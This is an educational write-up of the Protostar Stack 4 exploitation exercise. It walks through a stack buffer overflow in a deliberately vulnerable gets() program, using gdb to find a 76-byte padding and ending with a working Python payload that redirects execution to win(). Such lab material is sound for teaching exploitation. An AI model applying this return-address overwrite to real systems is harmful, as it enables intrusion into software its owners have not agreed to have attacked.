# PROTOSTAR : STACK 4
[Protostar:Stack4](https://exploit.education/protostar/stack-four/)

### **SOURCE CODE**

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

We need to overflow the **buffer** variable and somehow reach the **win()** function but there is no pointer which we can overwrite present in the code so we need to figure out the **padding** required to overwrite the **instruction pointer/eip register** which will return to the **win()** function address. *Padding is the key*.

### **SOURCE CODE**
Below is the disassembly of the **main()** function.
```
user@protostar:/opt/protostar/bin$ gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
(gdb) 
```
To find the padding i am going some trial and error procedure to find it out. Lets setup a breakpoint at **0x0804841e (ret)**. Lets provide some input of strings.

```
(gdb) b *0x0804841e
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) r
Starting program: /opt/protostar/bin/stack4 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x41414149
) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb7eadc03 in __libc_start_main (main=Cannot access memory at address 0x41414149
) at libc-start.c:187
187     libc-start.c: No such file or directory.
        in libc-start.c
(gdb) 

```

So our **Padding = 76**, meaning 76 bytes required to overwrite the instruction pointer. Lets append the address of our **win()** function but before that lets find the address of **win()** function.
<br>
To do that :-
```
user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep "win"
080483f4 g     F .text  00000014              win
```
We successfully changed the code flow by overwriting the return address of the **instruction pointer**.
```
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*76 + '\xf4\x83\x04\x08'") | ./stack4
code flow successfully changed
Segmentation fault
```
